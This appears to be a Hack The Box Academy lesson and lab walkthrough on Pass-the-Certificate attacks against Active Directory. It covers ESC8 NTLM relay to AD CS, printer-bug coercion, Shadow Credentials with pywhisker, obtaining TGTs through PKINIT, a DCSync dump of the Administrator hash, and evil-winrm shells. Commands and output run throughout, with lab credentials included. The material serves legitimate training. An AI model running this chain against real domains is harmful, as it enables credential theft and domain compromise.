

[PKINIT](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b), short for `Public Key Cryptography for Initial Authentication`, is an extension of the Kerberos protocol that enables the use of public key cryptography during the initial authentication exchange. It is typically used to support user logons via smart cards, which store the private keys. `Pass-the-Certificate` refers to the technique of using X.509 certificates to successfully obtain `Ticket Granting Tickets (TGTs)`. This method is used primarily alongside [attacks against Active Directory Certificate Services (AD CS)](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf), as well as in [Shadow Credential](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attacks.

## AD CS NTLM Relay Attack (ESC8)

**Note:** Attacks against Active Directory Certificate Services are covered in great depth in the [ADCS Attacks](https://academy.hackthebox.com/module/details/236) module.

`ESC8`—as described in the [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) paper—is an NTLM relay attack targeting an ADCS HTTP endpoint. ADCS supports multiple enrollment methods, `including web enrollment`, which by default occurs over HTTP. A certificate authority configured to allow web enrollment typically hosts the following application at `/CertSrv`:

![Microsoft Active Directory Certificate Services webpage for inlanefreight-CA01-CA. Options to request a certificate, view pending requests, or download a certificate chain or CRL.](https://academy.hackthebox.com/storage/modules/308/img/PtC_1.png)

Attackers can use Impacket’s [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) to listen for inbound connections and relay them to the web enrollment service using the following command:

  Pass the Certificate

```shell-session
xF1NN@htb[/htb]$ impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

**Note:** The value passed to `--template` may be different in other environments. This is simply the certificate template which is used by Domain Controllers for authentication. This can be enumerated with tools like [certipy](https://github.com/ly4k/Certipy).

Attackers can either wait for victims to attempt authentication against their machine randomly, or they can actively coerce them into doing so. One way to force machine accounts to authenticate against arbitrary hosts is by exploiting the [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py). This attack requires the targeted machine account to have the `Printer Spooler` service running. The command below forces `10.129.234.109 (DC01)` to attempt authentication against `10.10.16.12 (attacker host)`:

  Pass the Certificate

```shell-session
xF1NN@htb[/htb]$ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12

[*] Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attempting to trigger authentication via rprn RPC at 10.129.234.109
[*] Bind OK
[*] Got handle
RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
[*] Triggered RPC backconnect, this may or may not have worked
```

Referring back to `ntlmrelayx`, we can see from the output that the authentication request was successfully relayed to the web enrollment application, and a certificate was issued for `DC01$`:

  Pass the Certificate

```shell-session
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.129.234.109, attacking target http://10.129.234.110
[*] HTTP server returned error code 404, treating as a successful login
[*] Authenticating against http://10.129.234.110 as INLANEFREIGHT/DC01$ SUCCEED
[*] SMBD-Thread-7 (process_request_thread): Received connection from 10.129.234.109, attacking target http://10.129.234.110
[-] Authenticating against http://10.129.234.110 as / FAILED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID 8
[*] Writing PKCS#12 certificate to ./DC01$.pfx
[*] Certificate successfully written to file
```

We can now perform a `Pass-the-Certificate` attack to obtain a TGT as `DC01$`. One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py). First, let's clone the repository and install the dependencies:

  Pass the Certificate

```shell-session
xF1NN@htb[/htb]$ git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
xF1NN@htb[/htb]$ python3 -m venv .venv
xF1NN@htb[/htb]$ source .venv/bin/activate
xF1NN@htb[/htb]$ pip3 install -r requirements.txt
```

Then, we can begin the attack.

**Note:** If you encounter error stating `"Error detecting the version of libcrypto"`, it can be fixed by installing the [oscrypto](https://github.com/wbond/oscrypto) library.

  Pass the Certificate

```shell-session
xF1NN@htb[/htb]$ pip3 install -I git+https://github.com/wbond/oscrypto.git
Defaulting to user installation because normal site-packages is not writeable
Collecting git+https://github.com/wbond/oscrypto.git
<SNIP>
Successfully built oscrypto
Installing collected packages: asn1crypto, oscrypto
Successfully installed asn1crypto-1.5.1 oscrypto-1.3.0
```

  Pass the Certificate

```shell-session
xF1NN@htb[/htb]$ python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache

2025-04-28 21:20:40,073 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-04-28 21:20:40,351 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-04-28 21:21:05,508 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-04-28 21:21:05,508 minikerberos INFO     3a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e7dceb59dab90b8a54f39d616
INFO:minikerberos:3a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e7dceb59dab90b8a54f39d616
2025-04-28 21:21:05,512 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Once we successfully obtain a TGT, we're back in familiar Pass-the-Ticket (PtT) territory. As the domain controller's machine account, we can perform a DCSync attack to, for example, retrieve the NTLM hash of the domain administrator account:

  Pass the Certificate

```shell-session
xF1NN@htb[/htb]$ export KRB5CCNAME=/tmp/dc.ccache
xF1NN@htb[/htb]$ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:...SNIP...:::
<SNIP>
```

## Shadow Credentials (msDS-KeyCredentialLink)

[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT. In BloodHound, the `AddKeyCredentialLink` edge indicates that one user has write permissions over another user's `msDS-KeyCredentialLink` attribute, allowing them to take control of that user.

![Diagram showing a connection between two users, wwhite@inlanefreight.locall and jpinkman@inlanefreight.locall, labeled "AddKeyCredentialLink."](https://academy.hackthebox.com/storage/modules/308/img/PtC_2.png)

We can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform this attack from a Linux system. The command below generates an `X.509 certificate` and writes the `public key` to the victim user's `msDS-KeyCredentialLink` attribute:

  Pass the Certificate

```shell-session
xF1NN@htb[/htb]$ pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add

[*] Searching for the target account
[*] Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 3496da7f-ab0d-13e0-1273-5abca66f901d
[*] Updating the msDS-KeyCredentialLink attribute of jpinkman
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: eFUVVTPf.pfx
[+] PFX exportiert nach: eFUVVTPf.pfx
[i] Passwort für PFX: bmRH4LK7UwPrAOfvIx6W
[+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx
[*] Must be used with password: bmRH4LK7UwPrAOfvIx6W
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

In the output above, we can see that a `PFX (PKCS12)` file was created (`eFUVVTPf.pfx`), and the password is shown. We will use this file with `gettgtpkinit.py` to acquire a TGT as the victim:

  Pass the Certificate

```shell-session
xF1NN@htb[/htb]$ python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

2025-04-28 20:50:04,728 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-04-28 20:50:04,775 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-04-28 20:50:04,929 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-04-28 20:50:04,929 minikerberos INFO     f4fa8808fb476e6f982318494f75e002f8ee01c64199b3ad7419f927736ffdb8
INFO:minikerberos:f4fa8808fb476e6f982318494f75e002f8ee01c64199b3ad7419f927736ffdb8
2025-04-28 20:50:04,937 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

With the TGT obtained, we may once again `pass the ticket`:

  Pass the Certificate

```shell-session
xF1NN@htb[/htb]$ export KRB5CCNAME=/tmp/jpinkman.ccache
xF1NN@htb[/htb]$ klist

Ticket cache: FILE:/tmp/jpinkman.ccache
Default principal: jpinkman@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
04/28/2025 20:50:04  04/29/2025 06:50:04  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

In this case, we discovered that the victim user is a member of the `Remote Management Users` group, which permits them to connect to the machine via `WinRM`. As demonstrated in the previous section, we can use `Evil-WinRM` to connect using Kerberos (note: ensure that `krb5.conf` is properly configured):

  Pass the Certificate

```shell-session
xF1NN@htb[/htb]$ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jpinkman\Documents> whoami
inlanefreight\jpinkman
```

## No PKINIT?

In certain environments, an attacker may be able to obtain a certificate but be unable to use it for pre-authentication as specific victims (e.g., a domain controller machine account) due to the KDC not supporting the appropriate EKU. The tool [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/) was created for such situations. It can be used to authenticate against LDAPS using a certificate and perform various attacks (e.g., changing passwords or granting DCSync rights). This attack is outside the scope of this module but is worth reading about [here](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html).

---

## Onwards

Now that we've seen how to perform various lateral movement techniques from Windows and Linux hosts, we'll pivot to a new focus: password management. Note that we recommend practicing all these lateral movement techniques until they become second nature. You never know what you will run into during an assessment, so having an extensive toolset to fall back on is critical.

---
# Pass the Certificate

## Question 1

### “What are the contents of flag.txt on jpinkman's desktop?"

Students will start by using `git clone` on the [pywhisker](https://github.com/ShutdownRepo/pywhisker.git) repository:

Code: shell

```shell
git clone https://github.com/ShutdownRepo/pywhisker.git && cd pywhisker/pywhisker
```

  Pass the Certificate

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ git clone https://github.com/ShutdownRepo/pywhisker.git && cd pywhisker/pywhisker

Cloning into 'pywhisker'...
remote: Enumerating objects: 235, done.
remote: Counting objects: 100% (106/106), done.
remote: Compressing objects: 100% (40/40), done.
remote: Total 235 (delta 75), reused 75 (delta 66), pack-reused 129 (from 1)
Receiving objects: 100% (235/235), 2.10 MiB | 41.29 MiB/s, done.
Resolving deltas: 100% (115/115), done.
```

Students will then use `pywhisker.py` to generate a `.pfx` certificate for user `jpinkman`:

Code: shell

```shell
python3 pywhisker.py --dc-ip STMIP -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```

  Pass the Certificate

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~/pywhisker/pywhisker]
└──╼ [★]$ python3 pywhisker.py --dc-ip 10.129.156.68 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add

[*] Searching for the target account
[*] Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 5c502756-52ee-7cd1-3fcf-16b508bde82e
[*] Updating the msDS-KeyCredentialLink attribute of jpinkman
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: 1UCYb0YS.pfx
[+] PFX exportiert nach: 1UCYb0YS.pfx
[i] Passwort für PFX: 1P9EvC2tKKJlBSum4Ej4
[+] Saved PFX (#PKCS12) certificate & key at path: 1UCYb0YS.pfx
[*] Must be used with password: 1P9EvC2tKKJlBSum4Ej4
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Students will then `git clone` the `PKINITtools` repository, use a python virtual environment and install the requirements.

Code: shell

```shell
cd ~ && git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
```

  Pass the Certificate

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools

Cloning into 'PKINITtools'...
remote: Enumerating objects: 45, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 45 (delta 14), reused 10 (delta 10), pack-reused 27 (from 1)
Receiving objects: 100% (45/45), 28.08 KiB | 14.04 MiB/s, done.
Resolving deltas: 100% (21/21), done.

┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~/PKINITtools]
└──╼ [★]$ python3 -m venv .venv

┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~/PKINITtools]
└──╼ [★]$ source .venv/bin/activate

(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~/PKINITtools]
└──╼ [★]$ pip3 install -r requirements.txt

Collecting impacket
  Downloading impacket-0.12.0.tar.gz (1.6 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.6/1.6 MB 48.6 MB/s eta 0:00:00
  Preparing metadata (setup.py) ... done
  
<SNIP>
```

Now students need to use the `gettgtpkinit.py` to generate a `TGT` file using the `.pfx` file with the pfx password generated by `pywhisker` alongside the `DC` IP address. But first students need to fix `"Error detecting the version of libcrypto"`, by fixing a package using:

Code: shell

```shell
pip3 install -I git+https://github.com/wbond/oscrypto.git
```

  Pass the Certificate

```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ pip3 install -I git+https://github.com/wbond/oscrypto.git

Collecting git+https://github.com/wbond/oscrypto.git
<SNIP>
Successfully installed asn1crypto-1.5.1 oscrypto-1.3.0
```

Code: shell

```shell
python3 gettgtpkinit.py -cert-pfx ../pywhisker/pywhisker/1UCYb0YS.pfx -pfx-pass '1P9EvC2tKKJlBSum4Ej4' -dc-ip STMIP INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```

  Pass the Certificate

```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~/PKINITtools]
└──╼ [★]$ python3 gettgtpkinit.py -cert-pfx ../pywhisker/pywhisker/1UCYb0YS.pfx -pfx-pass '1P9EvC2tKKJlBSum4Ej4' -dc-ip 10.129.156.68 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

2025-06-11 04:55:30,320 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-06-11 04:55:30,348 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-06-11 04:55:53,350 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-06-11 04:55:53,350 minikerberos INFO     bf43d22231614ddf13f1a5bcc40fad1c98ea8fc6edee8b4cc969dde847c1d890
INFO:minikerberos:bf43d22231614ddf13f1a5bcc40fad1c98ea8fc6edee8b4cc969dde847c1d890
2025-06-11 04:55:53,356 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Students need to install the `krb5-user` package:

Code: shell

```shell
sudo apt-get install krb5-user -y
```

  Pass the Certificate

```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ sudo apt-get install krb5-user -y
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
<SNIP>
Launchers are updated
```

Once this is done, students need to update and setup the `krb5.conf` file located at `/etc/krb5.conf` to point to the `INLANEFREIGHT.LOCAL` domain and KDC as such:

Code: shell

```shell
sudo nano /etc/krb5.conf
```

![Password_Attacks_Walkthrough_Image_30.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_30.png)

Students will also add the `dc01.inlanefreight.local` to the `/etc/hosts` file:

Code: shell

```shell
echo "SMTIP   dc01.inlanefreight.local" | sudo tee -a /etc/hosts
```

  Pass the Certificate

```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ echo "10.129.156.68   dc01.inlanefreight.local" | sudo tee -a /etc/hosts

10.129.156.68   dc01.inlanefreight.local
```

Students will then export the value `/tmp/jpinkman.ccache` to the `KRB5CCNAME` environment variable and by running the `klist` command, students will now see the ticket cache file for `jpinkman`.

Code: shell

```shell
export KRB5CCNAME=/tmp/jpinkman.ccache
klist
```

  Pass the Certificate

```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.15.117]─[htb-ac-569447@htb-qsycfzvxwh]─[~/PKINITtools]
└──╼ [★]$ export KRB5CCNAME=/tmp/jpinkman.ccache

(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ klist

Ticket cache: FILE:/tmp/jpinkman.ccache
Default principal: jpinkman@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
06/11/2025 04:55:29  06/11/2025 14:55:29  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

Students will now use the ticket alongside `evil-winrm` to obtain a shell:

Code: shell

```shell
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

  Pass the Certificate

```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jpinkman\Documents>
```

Students will then use the `type` command to read the flag located at `C:\Users\jpinkman\Desktop\flag.txt`

Code: shell

```shell
type C:\Users\jpinkman\Desktop\flag.txt
```

  Pass the Certificate

```shell-session
*Evil-WinRM* PS C:\Users\jpinkman\Documents> type C:\Users\jpinkman\Desktop\flag.txt

{hidden}
```

Answer: {hidden}

# Pass the Certificate

## Question 2

### “What are the contents of flag.txt on Administrator's desktop?"

Students will start by using Impacket’s `ntlmrelayx` to listen for inbound connections and relay them to the web enrollment service (ACADEMY-PWATTCK-PTCCA01) using the following command:



```shell
sudo impacket-ntlmrelayx -t http://STMIP/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```



```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ sudo impacket-ntlmrelayx -t http://10.129.19.224/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication

Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
Exception in thread Thread-2:
Traceback (most recent call last):
  File "/usr/lib/python3.11/threading.py", line 1038, in _bootstrap_inner
    self.run()
  File "/usr/local/lib/python3.11/dist-packages/impacket/examples/ntlmrelayx/servers/httprelayserver.py", line 560, in run
    self.server = self.HTTPServer((self.config.interfaceIp, self.config.listeningPort), self.HTTPHandler, self.config)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.11/dist-packages/impacket/examples/ntlmrelayx/servers/httprelayserver.py", line 47, in __init__
    socketserver.TCPServer.__init__(self,server_address, RequestHandlerClass)
  File "/usr/lib/python3.11/socketserver.py", line 456, in __init__
    self.server_bind()
  File "/usr/lib/python3.11/socketserver.py", line 472, in server_bind
    self.socket.bind(self.server_address)
OSError: [Errno 98] Address already in use
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

Students then need to download and use `printerbug.py` to coerce the `DC` (ACADEMY-PWATTCK-PTCDC01) to attempt authentication against the attacker host:


```shell
wget -q https://raw.githubusercontent.com/dirkjanm/krbrelayx/refs/heads/master/printerbug.py
```


```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/dirkjanm/krbrelayx/refs/heads/master/printerbug.py
```

Students will perform coercion using `printerbug.py` with the credentials `wwhite:package5shores_topher1`:

Code: shell

```shell
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@STMIP PWNIP
```



```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.156.68 10.10.14.209
[*] Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Attempting to trigger authentication via rprn RPC at 10.129.156.68
[*] Bind OK
[*] Got handle
RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
[*] Triggered RPC backconnect, this may or may not have worked
```

At the same time `ntlmrelayx` listener will receive a connection and generate the `.pfx` certificate file.


```shell-session
<SNIP>

[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.129.156.68, attacking target http://10.129.19.224
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://10.129.19.224 as INLANEFREIGHT/DC01$ SUCCEED
[*] SMBD-Thread-7 (process_request_thread): Received connection from 10.129.156.68, attacking target http://10.129.19.224
[-] Authenticating against http://10.129.19.224 as / FAILED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID 13
[*] Writing PKCS#12 certificate to ./DC01$.pfx
[*] Certificate successfully written to file
```

Students will then `git clone` the `PKINITtools` repository, use a python virtual environment and install the requirements.



```shell
cd ~ && git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
```



```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools

Cloning into 'PKINITtools'...
remote: Enumerating objects: 45, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 45 (delta 14), reused 10 (delta 10), pack-reused 27 (from 1)
Receiving objects: 100% (45/45), 28.08 KiB | 14.04 MiB/s, done.
Resolving deltas: 100% (21/21), done.

┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~/PKINITtools]
└──╼ [★]$ python3 -m venv .venv

┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~/PKINITtools]
└──╼ [★]$ source .venv/bin/activate

(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~/PKINITtools]
└──╼ [★]$ pip3 install -r requirements.txt

Collecting impacket
  Downloading impacket-0.12.0.tar.gz (1.6 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.6/1.6 MB 48.6 MB/s eta 0:00:00
  Preparing metadata (setup.py) ... done
  
<SNIP>
```

Now students need to use the `gettgtpkinit.py` to generate a `TGT` file using the `.pfx` file with the password generated by `pywhisker` alongside the `DC` IP address. But first students will fix the `"Error detecting the version of libcrypto"` error by installing the `oscrypto` module:



```shell
pip3 install -I git+https://github.com/wbond/oscrypto.git
```

 
```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ pip3 install -I git+https://github.com/wbond/oscrypto.git

Collecting git+https://github.com/wbond/oscrypto.git
<SNIP>
Successfully installed asn1crypto-1.5.1 oscrypto-1.3.0
```

Students will proceed to generate a Ticket Granting Ticket using `gettgtpkinit.py` and the previously obtained `DC01.pfx` file and save the ticket as `/tmp/dc.ccache`:



```shell
python3 gettgtpkinit.py -cert-pfx ../DC01\$.pfx -dc-ip STMIP 'inlanefreight.local/dc01$' /tmp/dc.ccache
```

 

```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~/PKINITtools]
└──╼ [★]$ python3 gettgtpkinit.py -cert-pfx ../DC01\$.pfx -dc-ip 10.129.156.68 'inlanefreight.local/dc01$' /tmp/dc.ccache

2025-06-11 05:39:53,556 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-06-11 05:39:53,857 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-06-11 05:40:05,956 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-06-11 05:40:05,956 minikerberos INFO     f89e3fb8763565a71f639825f36826dae6540264994f22e67d699b27712cbe6a
INFO:minikerberos:f89e3fb8763565a71f639825f36826dae6540264994f22e67d699b27712cbe6a
2025-06-11 05:40:05,962 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Students need to export the generated TGT file path as an environment variable with the name `KRB5CCNAME`:



```shell
export KRB5CCNAME=/tmp/dc.ccache
```



```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~/PKINITtools]
└──╼ [★]$ export KRB5CCNAME=/tmp/dc.ccache
```

Students will also need to install the `krb5-user` package:



```shell
sudo apt-get install krb5-user -y
```



```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ sudo apt-get install krb5-user -y

Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
<SNIP>
Launchers are updated
```

Once this is done, students need to setup the `krb5.conf` file located at `/etc/krb5.conf` to configure the realm and the KDC as seen below:



```shell
sudo nano /etc/krb5.conf
```

![Password_Attacks_Walkthrough_Image_31.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_31.png)

Students will also add the `dc01.inlanefreight.local` to the `/etc/hosts` file:



```shell
echo "STMIP   dc01.inlanefreight.local" | sudo tee -a /etc/hosts
```



```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ echo "10.129.156.68   dc01.inlanefreight.local" | sudo tee -a /etc/hosts

10.129.156.68   dc01.inlanefreight.local
```

By running the `klist` command, students will now see the ticket cache file for `dc01$`.



```shell
klist
```



```shell-session
